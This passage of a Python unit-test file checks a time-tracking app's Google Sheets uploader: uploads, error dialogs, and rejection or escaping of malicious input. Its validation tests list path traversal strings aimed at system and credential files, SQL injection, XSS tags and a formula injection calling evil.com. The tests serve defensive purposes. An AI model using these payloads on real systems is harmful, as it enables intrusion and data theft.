            uploader = GoogleSheetsUploader(test_file)

            # Mock credentials
            uploader.credentials = Mock()
            uploader.credentials.valid = True
            uploader.service = mock_service

            # Mock values.get() for header check
            mock_get = Mock()
            mock_values.get.return_value = mock_get
            mock_get.execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Date",
                        "Sphere",
                        "Session Start Time",
                        "Session End Time",
                        "Session Total Duration (min)",
                        "Session Active Duration (min)",
                        "Session Break Duration (min)",
                        "Type",
                        "Project",
                        "Project Comment",
                        "Secondary Project",
                        "Secondary Comment",
                        "Secondary Percentage",
                        "Activity Start",
                        "Activity End",
                        "Activity Duration (min)",
                        "Break Action",
                        "Secondary Action",
                        "Active Notes",
                        "Break Notes",
                        "Idle Notes",
                        "Session Notes",
                    ]
                ]
            }

            # Create session data with new detailed format
            session_data = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "Work",
                "total_duration": 1800,
                "active_duration": 1500,
                "break_duration": 300,
                "session_comments": {
                    "active_notes": "",
                    "break_notes": "",
                    "idle_notes": "",
                    "session_notes": "",
                },
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:25:00",
                        "duration": 1500,
                        "project": "Testing",
                        "comment": "Working on tests",
                    }
                ],
                "breaks": [],
                "idle_periods": [],
            }

            # Upload
            result = uploader.upload_session(session_data, "test_session_123")

            # Verify the upload succeeded
            self.assertTrue(result)

            # Verify append was called with correct parameters
            mock_values.append.assert_called_once()
            call_kwargs = mock_values.append.call_args[1]

            # Verify spreadsheet ID
            self.assertEqual(call_kwargs["spreadsheetId"], "test_spreadsheet_123")

            # Verify range (sheet name)
            self.assertIn("Sessions", call_kwargs["range"])

            # Verify value input option
            self.assertEqual(call_kwargs["valueInputOption"], "USER_ENTERED")

            # Verify the data structure sent to Google
            body = call_kwargs["body"]
            self.assertIn("values", body)
            values = body["values"]
            self.assertEqual(len(values), 1)  # One row for the active period

            # Verify row contains expected data (detailed format)
            row = values[0]
            self.assertEqual(row[0], "test_session_123")  # session_id
            self.assertEqual(row[1], "2024-01-20")  # date
            self.assertEqual(row[2], "Work")  # sphere
            self.assertEqual(row[8], "active")  # type
            self.assertEqual(row[9], "Testing")  # project
            self.assertEqual(row[10], "Working on tests")  # project_comment

        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_google_sheets_optional_dependency(self):
        """Test that app works without Google Sheets dependencies"""
        # Test that the app can handle missing Google API libraries
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # If import succeeds, verify it handles missing credentials gracefully
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {"enabled": False}

            test_file = self.file_manager.create_test_file(
                "test_optional.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            self.assertFalse(uploader.is_enabled())
        except ImportError:
            # Expected when Google API libraries not installed
            # App should continue working without Google Sheets
            pass


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsInputValidation(unittest.TestCase):
    """Test input validation for Google Sheets integration"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch.dict(os.environ, {}, clear=False)
    def test_valid_spreadsheet_id(self):
        """Test that valid spreadsheet IDs are accepted"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Clear any Google Sheets env vars that might interfere
            os.environ.pop("GOOGLE_SHEETS_SPREADSHEET_ID", None)
            os.environ.pop("GOOGLE_SHEETS_CREDENTIALS_FILE", None)
            os.environ.pop("GOOGLE_SHEETS_TOKEN_FILE", None)

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_valid_id.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            spreadsheet_id = uploader.get_spreadsheet_id()

            # Should return the valid ID
            self.assertEqual(
                spreadsheet_id, "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms"
            )
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_malicious_spreadsheet_id_rejected(self):
        """Test that malicious spreadsheet IDs are rejected"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            malicious_ids = [
                "../../../etc/passwd",
                "'; DROP TABLE sessions; --",
                "<script>alert('xss')</script>",
                "../../sensitive/data",
                "C:\\Windows\\System32\\config",
            ]

            for malicious_id in malicious_ids:
                settings = TestDataGenerator.create_settings_data()
                settings["google_sheets"] = {
                    "enabled": True,
                    "spreadsheet_id": malicious_id,
                    "sheet_name": "Sessions",
                }

                test_file = self.file_manager.create_test_file(
                    "test_malicious_name.json", settings
                )

                uploader = GoogleSheetsUploader(test_file)
                spreadsheet_id = uploader.get_spreadsheet_id()

                # Should reject malicious ID and return empty string
                self.assertEqual(
                    spreadsheet_id, "", f"Failed to reject malicious ID: {malicious_id}"
                )
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_malicious_sheet_name_sanitized(self):
        """Test that malicious sheet names are sanitized"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            malicious_names = [
                "<script>alert('xss')</script>",
                "Sheet'; DROP TABLE--",
                "../../../secrets",
                "Sheet\\with\\paths",
            ]

            for malicious_name in malicious_names:
                settings = TestDataGenerator.create_settings_data()
                settings["google_sheets"] = {
                    "enabled": True,
                    "spreadsheet_id": "valid_id_123",
                    "sheet_name": malicious_name,
                }

                test_file = self.file_manager.create_test_file(
                    "test_malicious_id.json", settings
                )

                uploader = GoogleSheetsUploader(test_file)
                sheet_name = uploader.get_sheet_name()

                # Should sanitize to default "Sessions"
                self.assertEqual(
                    sheet_name,
                    "Sessions",
                    f"Failed to sanitize malicious sheet name: {malicious_name}",
                )
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_path_traversal_in_credentials_blocked(self):
        """Test that path traversal in credentials file is blocked"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            dangerous_paths = [
                "../../../etc/passwd",
                "C:\\Windows\\System32\\config\\sam",
                "~/sensitive/data.json",
                "%APPDATA%/secrets.json",
            ]

            for dangerous_path in dangerous_paths:
                settings = TestDataGenerator.create_settings_data()
                settings["google_sheets"] = {
                    "enabled": True,
                    "spreadsheet_id": "valid_id",
                    "credentials_file": dangerous_path,
                }

                test_file = self.file_manager.create_test_file(
                    "test_path_traversal.json", settings
                )

                uploader = GoogleSheetsUploader(test_file)
                # Authentication should fail for unsafe paths
                result = uploader.authenticate()
                self.assertFalse(
                    result, f"Failed to block path traversal: {dangerous_path}"
                )
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    def test_environment_variables_override_settings(self):
        """Test that environment variables take precedence over settings file"""
        try:
            import os
            from src.google_sheets_integration import GoogleSheetsUploader

            # Set environment variable
            os.environ["GOOGLE_SHEETS_SPREADSHEET_ID"] = "env_spreadsheet_123"

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "settings_spreadsheet_456",
                "sheet_name": "Sessions",
            }

            test_file = "test_env_vars.json"
            self.file_manager.create_test_file(test_file, settings)

            uploader = GoogleSheetsUploader(test_file)
            spreadsheet_id = uploader.get_spreadsheet_id()

            # Should use environment variable, not settings file
            self.assertEqual(spreadsheet_id, "env_spreadsheet_123")

            # Cleanup
            del os.environ["GOOGLE_SHEETS_SPREADSHEET_ID"]
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestEscapeForSheets(unittest.TestCase):
    """Test formula injection prevention"""

    def test_escape_formula_injection_equals(self):
        """Test that formulas starting with = are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "=1+1"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'=1+1")

    def test_escape_formula_injection_plus(self):
        """Test that formulas starting with + are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "+A1+A2"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'+A1+A2")

    def test_escape_formula_injection_minus(self):
        """Test that formulas starting with - are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "-A1"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'-A1")

    def test_escape_formula_injection_at(self):
        """Test that formulas starting with @ are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "@IMPORTDATA('http://evil.com')"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'@IMPORTDATA('http://evil.com')")

    def test_escape_formula_injection_pipe(self):
        """Test that formulas starting with | are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        malicious = "|evil"
        result = escape_for_sheets(malicious)
        self.assertEqual(result, "'|evil")

    def test_escape_html_characters(self):
        """Test that HTML/XML characters are escaped"""
        from src.google_sheets_integration import escape_for_sheets

        text = "Text with <script>alert('xss')</script>"
        result = escape_for_sheets(text)
        self.assertIn("&lt;", result)
        self.assertIn("&gt;", result)
        self.assertEqual(result, "Text with &lt;script&gt;alert('xss')&lt;/script&gt;")

    def test_escape_empty_string(self):
        """Test that empty strings are handled"""
        from src.google_sheets_integration import escape_for_sheets

        result = escape_for_sheets("")
        self.assertEqual(result, "")

    def test_escape_none(self):
        """Test that None is handled"""
        from src.google_sheets_integration import escape_for_sheets

        result = escape_for_sheets(None)
        self.assertEqual(result, "")

    def test_escape_normal_text(self):
        """Test that normal text passes through"""
        from src.google_sheets_integration import escape_for_sheets

        text = "Normal project notes"
        result = escape_for_sheets(text)
        self.assertEqual(result, text)


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsUploadSession(unittest.TestCase):
    """Test actual upload_session method"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_disabled_returns_false(self, mock_exists):
        """Test that upload returns False when Google Sheets disabled"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {"enabled": False}

            test_file = self.file_manager.create_test_file(
                "test_upload_disabled.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            session_data = TestDataGenerator.create_session_data()
            session = list(session_data.values())[0]

            result = uploader.upload_session(session, "test_session_123")
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.os.path.exists")
    def test_upload_no_spreadsheet_id_returns_false(self, mock_exists):
        """Test that upload returns False without spreadsheet ID"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "",  # No ID
            }

            test_file = self.file_manager.create_test_file(
                "test_upload_no_id.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            session_data = TestDataGenerator.create_session_data()
            session = list(session_data.values())[0]

            result = uploader.upload_session(session, "test_session_123")
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    def test_upload_session_data_format(self, mock_error):
        """Test that session data is formatted correctly for upload"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            # Create uploader with test settings
            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_upload_format.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)

            # Without authentication, service is None
            self.assertIsNone(uploader.service)

            # Create test session with known data
            session = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "Work",
                "project": "Testing",
                "total_duration": 1800,  # 30 min in seconds
                "active_duration": 1500,  # 25 min
                "break_duration": 300,  # 5 min
                "actions": [{"time": "10:00:00"}],
                "break_actions": [{"actions": [{"time": "10:25:00"}]}],
                "notes": "Test notes",
            }

            # Upload will fail without service, but that's expected
            # This test verifies the data structure is correct
            result = uploader.upload_session(session, "session_123")

            # Should return False since we can't authenticate
            self.assertFalse(result)

            # Verify session has all required fields
            self.assertIn("date", session)
            self.assertIn("start_time", session)
            self.assertIn("sphere", session)
            self.assertIn("project", session)
            self.assertIn("total_duration", session)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")


@unittest.skipIf(
    not GOOGLE_SHEETS_AVAILABLE, "Google Sheets dependencies not installed"
)
class TestGoogleSheetsTestConnection(unittest.TestCase):
    """Test connection testing functionality"""

    def setUp(self):
        """Set up test fixtures"""
        self.file_manager = TestFileManager()
        self.addCleanup(self.file_manager.cleanup)

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists")
    def test_connection_no_spreadsheet_id(self, mock_exists, mock_error):
        """Test connection test fails without spreadsheet ID"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "",
            }

            test_file = self.file_manager.create_test_file(
                "test_connection_no_id.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            success, message = uploader.test_connection()

            self.assertFalse(success)
            self.assertIn("No spreadsheet ID", message)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.os.path.exists")
    @patch.dict(os.environ, {}, clear=False)
    def test_connection_success(self, mock_exists, mock_error):
        """Test successful connection message format"""
        try:
            # Clear any Google Sheets env vars that might interfere
            os.environ.pop("GOOGLE_SHEETS_SPREADSHEET_ID", None)
            os.environ.pop("GOOGLE_SHEETS_CREDENTIALS_FILE", None)
            os.environ.pop("GOOGLE_SHEETS_TOKEN_FILE", None)

            from src.google_sheets_integration import GoogleSheetsUploader

            # Mock that credentials file doesn't exist to prevent authentication
            mock_exists.return_value = False

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_123",
            }

            test_file = self.file_manager.create_test_file(
                "test_connection_success.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            success, message = uploader.test_connection()

            # Without authentication, should fail
            self.assertFalse(success)
            # Message should indicate authentication failure
            self.assertIn("Authentication", message)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.GoogleSheetsUploader.authenticate")
    def test_connection_404_not_found_error(self, mock_auth, mock_error):
        """Test connection shows user-actionable error for 404 Not Found"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "invalid_spreadsheet_id",
            }

            test_file = self.file_manager.create_test_file(
                "test_connection_404.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)

            # Mock authenticate to return True without actually authenticating
            mock_auth.return_value = True

            # Mock service to raise 404 HttpError
            mock_service = Mock()
            mock_response = Mock()
            mock_response.status = 404
            http_error = HttpError(mock_response, b"Not Found")
            mock_service.spreadsheets().get().execute.side_effect = http_error
            uploader.service = mock_service

            # Test connection
            success, message = uploader.test_connection()

            # Should show error dialog with helpful troubleshooting
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Connection Error")
            self.assertIn("Spreadsheet not found", call_args[1])
            self.assertIn("invalid_spreadsheet_id", call_args[1])  # Shows ID
            self.assertIn("Verify the spreadsheet ID", call_args[1])
            self.assertIn("Check that the spreadsheet still exists", call_args[1])

            # Should return False with descriptive message
            self.assertFalse(success)
            self.assertIn("not found", message.lower())
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.GoogleSheetsUploader.authenticate")
    def test_connection_403_permission_error(self, mock_auth, mock_error):
        """Test connection shows user-actionable error for 403 Permission Denied"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "restricted_spreadsheet_id",
            }

            test_file = self.file_manager.create_test_file(
                "test_connection_403.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)

            # Mock authenticate to return True without actually authenticating
            mock_auth.return_value = True

            # Mock service to raise 403 HttpError
            mock_service = Mock()
            mock_response = Mock()
            mock_response.status = 403
            http_error = HttpError(mock_response, b"Permission Denied")
            mock_service.spreadsheets().get().execute.side_effect = http_error
            uploader.service = mock_service

            # Test connection
            success, message = uploader.test_connection()

            # Should show error dialog with helpful troubleshooting
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Permission Error")
            self.assertIn("Permission denied", call_args[1])
            self.assertIn("restricted_spreadsheet_id", call_args[1])  # Shows ID
            self.assertIn(
                "Share the spreadsheet with your Google account", call_args[1]
            )
            self.assertIn("Viewer", call_args[1])

            # Should return False with descriptive message
            self.assertFalse(success)
            self.assertIn("Permission denied", message)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.GoogleSheetsUploader.authenticate")
    def test_connection_http_error_generic(self, mock_auth, mock_error):
        """Test connection shows user-actionable error for generic HTTP errors"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_spreadsheet_id",
            }

            test_file = self.file_manager.create_test_file(
                "test_connection_http_error.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)

            # Mock authenticate to return True without actually authenticating
            mock_auth.return_value = True

            # Mock service to raise 500 HttpError (server error)
            mock_service = Mock()
            mock_response = Mock()
            mock_response.status = 500
            http_error = HttpError(mock_response, b"Internal Server Error")
            mock_service.spreadsheets().get().execute.side_effect = http_error
            uploader.service = mock_service

            # Test connection
            success, message = uploader.test_connection()

            # Should show error dialog with helpful troubleshooting
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Connection Error")
            self.assertIn("Failed to connect", call_args[1])
            self.assertIn("HTTP Status: 500", call_args[1])  # Shows status code
            self.assertIn("Check your internet connection", call_args[1])
            self.assertIn("Verify the spreadsheet ID", call_args[1])

            # Should return False with descriptive message
            self.assertFalse(success)
            self.assertIn("HTTP Error 500", message)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.GoogleSheetsUploader.authenticate")
    def test_connection_unexpected_exception(self, mock_auth, mock_error):
        """Test connection shows user-actionable error for unexpected exceptions"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_spreadsheet_id",
            }

            test_file = self.file_manager.create_test_file(
                "test_connection_exception.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)

            # Mock authenticate to return True without actually authenticating
            mock_auth.return_value = True

            # Mock service to raise unexpected exception (not HttpError)
            # The test_connection method calls: service.spreadsheets().get(spreadsheetId=...).execute()
            mock_service = Mock()
            mock_spreadsheets = Mock()
            mock_get_result = Mock()
            mock_get_result.execute.side_effect = ValueError("Unexpected network error")
            mock_spreadsheets.get.return_value = mock_get_result
            mock_service.spreadsheets.return_value = mock_spreadsheets
            uploader.service = mock_service

            # Test connection
            success, message = uploader.test_connection()

            # Should show error dialog with helpful troubleshooting
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Connection Error")
            self.assertIn("Unexpected error", call_args[1])
            self.assertIn(
                "Unexpected network error", call_args[1]
            )  # Shows actual error
            self.assertIn("Check your internet connection", call_args[1])
            self.assertIn("Try re-authenticating", call_args[1])

            # Should return False with descriptive message
            self.assertFalse(success)
            self.assertIn("Error:", message)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.GoogleSheetsUploader.authenticate")
    def test_upload_session_403_permission_error(self, mock_auth, mock_error):
        """Test upload_session shows user-actionable error for 403 Permission Denied"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_spreadsheet_id",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_upload_403.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)

            # Mock authenticate to return True
            mock_auth.return_value = True

            # Mock service to raise 403 on append
            mock_service = Mock()
            mock_response = Mock()
            mock_response.status = 403
            http_error = HttpError(mock_response, b"Permission Denied")

            # Mock the entire chain: service.spreadsheets().values().append().execute()
            mock_append = Mock()
            mock_append.execute.side_effect = http_error
            mock_service.spreadsheets().values().append.return_value = mock_append

            # Mock header check to pass
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Date",
                        "Sphere",
                        "Session Start Time",
                        "Session End Time",
                        "Session Total Duration (min)",
                        "Session Active Duration (min)",
                        "Session Break Duration (min)",
                        "Type",
                        "Project",
                        "Project Comment",
                        "Secondary Project",
                        "Secondary Comment",
                        "Secondary Percentage",
                        "Activity Start",
                        "Activity End",
                        "Activity Duration (min)",
                        "Break Action",
                        "Secondary Action",
                        "Active Notes",
                        "Break Notes",
                        "Idle Notes",
                        "Session Notes",
                    ]
                ]
            }

            uploader.service = mock_service

            # Create test session
            session_data = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "Work",
                "total_duration": 1800,
                "active_duration": 1500,
                "break_duration": 300,
                "session_comments": {},
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:25:00",
                        "duration": 1500,
                        "project": "Test Project",
                        "comment": "Test",
                    }
                ],
                "breaks": [],
                "idle_periods": [],
            }

            # Upload should fail
            result = uploader.upload_session(session_data, "test_session_123")

            # Should show error dialog
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Upload Error")
            self.assertIn("Permission denied", call_args[1])
            self.assertIn("test_spreadsheet_id", call_args[1])
            self.assertIn("Editor", call_args[1])
            self.assertIn("Share the spreadsheet", call_args[1])

            # Should return False
            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.GoogleSheetsUploader.authenticate")
    def test_upload_session_404_not_found_error(self, mock_auth, mock_error):
        """Test upload_session shows user-actionable error for 404 Not Found"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "invalid_id",
                "sheet_name": "MissingSheet",
            }

            test_file = self.file_manager.create_test_file(
                "test_upload_404.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            mock_auth.return_value = True

            # Mock service to raise 404 on append
            mock_service = Mock()
            mock_response = Mock()
            mock_response.status = 404
            http_error = HttpError(mock_response, b"Not Found")

            mock_append = Mock()
            mock_append.execute.side_effect = http_error
            mock_service.spreadsheets().values().append.return_value = mock_append

            # Mock header check to pass
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Date",
                        "Sphere",
                        "Session Start Time",
                        "Session End Time",
                        "Session Total Duration (min)",
                        "Session Active Duration (min)",
                        "Session Break Duration (min)",
                        "Type",
                        "Project",
                        "Project Comment",
                        "Secondary Project",
                        "Secondary Comment",
                        "Secondary Percentage",
                        "Activity Start",
                        "Activity End",
                        "Activity Duration (min)",
                        "Break Action",
                        "Secondary Action",
                        "Active Notes",
                        "Break Notes",
                        "Idle Notes",
                        "Session Notes",
                    ]
                ]
            }

            uploader.service = mock_service

            session_data = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "Work",
                "total_duration": 1800,
                "active_duration": 1500,
                "break_duration": 300,
                "session_comments": {},
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:25:00",
                        "duration": 1500,
                        "project": "Test",
                        "comment": "",
                    }
                ],
                "breaks": [],
                "idle_periods": [],
            }

            result = uploader.upload_session(session_data, "test_session_123")

            # Should show error dialog
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Upload Error")
            self.assertIn("not found", call_args[1].lower())
            self.assertIn("invalid_id", call_args[1])
            self.assertIn("MissingSheet", call_args[1])

            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.GoogleSheetsUploader.authenticate")
    def test_upload_session_400_bad_request_error(self, mock_auth, mock_error):
        """Test upload_session shows user-actionable error for 400 Bad Request"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader
            from googleapiclient.errors import HttpError

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_id",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_upload_400.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            mock_auth.return_value = True

            # Mock service to raise 400 on append
            mock_service = Mock()
            mock_response = Mock()
            mock_response.status = 400
            http_error = HttpError(mock_response, b"Bad Request")

            mock_append = Mock()
            mock_append.execute.side_effect = http_error
            mock_service.spreadsheets().values().append.return_value = mock_append

            # Mock header check to pass
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Date",
                        "Sphere",
                        "Session Start Time",
                        "Session End Time",
                        "Session Total Duration (min)",
                        "Session Active Duration (min)",
                        "Session Break Duration (min)",
                        "Type",
                        "Project",
                        "Project Comment",
                        "Secondary Project",
                        "Secondary Comment",
                        "Secondary Percentage",
                        "Activity Start",
                        "Activity End",
                        "Activity Duration (min)",
                        "Break Action",
                        "Secondary Action",
                        "Active Notes",
                        "Break Notes",
                        "Idle Notes",
                        "Session Notes",
                    ]
                ]
            }

            uploader.service = mock_service

            session_data = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "Work",
                "total_duration": 1800,
                "active_duration": 1500,
                "break_duration": 300,
                "session_comments": {},
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:25:00",
                        "duration": 1500,
                        "project": "Test",
                        "comment": "",
                    }
                ],
                "breaks": [],
                "idle_periods": [],
            }

            result = uploader.upload_session(session_data, "test_session_123")

            # Should show error dialog
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Upload Error")
            self.assertIn("Invalid data format", call_args[1])
            self.assertIn("sheet structure", call_args[1])

            self.assertFalse(result)
        except ImportError:
            self.skipTest("Google Sheets dependencies not installed")

    @patch("src.google_sheets_integration.messagebox.showerror")
    @patch("src.google_sheets_integration.GoogleSheetsUploader.authenticate")
    def test_upload_session_unexpected_exception(self, mock_auth, mock_error):
        """Test upload_session shows user-actionable error for unexpected exceptions"""
        try:
            from src.google_sheets_integration import GoogleSheetsUploader

            settings = TestDataGenerator.create_settings_data()
            settings["google_sheets"] = {
                "enabled": True,
                "spreadsheet_id": "test_id",
                "sheet_name": "Sessions",
            }

            test_file = self.file_manager.create_test_file(
                "test_upload_exception.json", settings
            )

            uploader = GoogleSheetsUploader(test_file)
            mock_auth.return_value = True

            # Mock service to raise unexpected exception
            mock_service = Mock()
            mock_append = Mock()
            mock_append.execute.side_effect = ValueError("Unexpected network error")
            mock_service.spreadsheets().values().append.return_value = mock_append

            # Mock header check to pass
            mock_service.spreadsheets().values().get().execute.return_value = {
                "values": [
                    [
                        "Session ID",
                        "Date",
                        "Sphere",
                        "Session Start Time",
                        "Session End Time",
                        "Session Total Duration (min)",
                        "Session Active Duration (min)",
                        "Session Break Duration (min)",
                        "Type",
                        "Project",
                        "Project Comment",
                        "Secondary Project",
                        "Secondary Comment",
                        "Secondary Percentage",
                        "Activity Start",
                        "Activity End",
                        "Activity Duration (min)",
                        "Break Action",
                        "Secondary Action",
                        "Active Notes",
                        "Break Notes",
                        "Idle Notes",
                        "Session Notes",
                    ]
                ]
            }

            uploader.service = mock_service

            session_data = {
                "date": "2024-01-20",
                "start_time": "10:00:00",
                "end_time": "10:30:00",
                "sphere": "Work",
                "total_duration": 1800,
                "active_duration": 1500,
                "break_duration": 300,
                "session_comments": {},
                "active": [
                    {
                        "start": "10:00:00",
                        "end": "10:25:00",
                        "duration": 1500,
                        "project": "Test",
                        "comment": "",
                    }
                ],
                "breaks": [],
                "idle_periods": [],
            }

            result = uploader.upload_session(session_data, "test_session_123")

            # Should show error dialog
            mock_error.assert_called_once()
            call_args = mock_error.call_args[0]
            self.assertEqual(call_args[0], "Google Sheets Upload Error")
            self.assertIn("Unexpected error", call_args[1])
            self.assertIn("Unexpected network error", call_args[1])
            self.assertIn("Try re-authenticating", call_args[1])

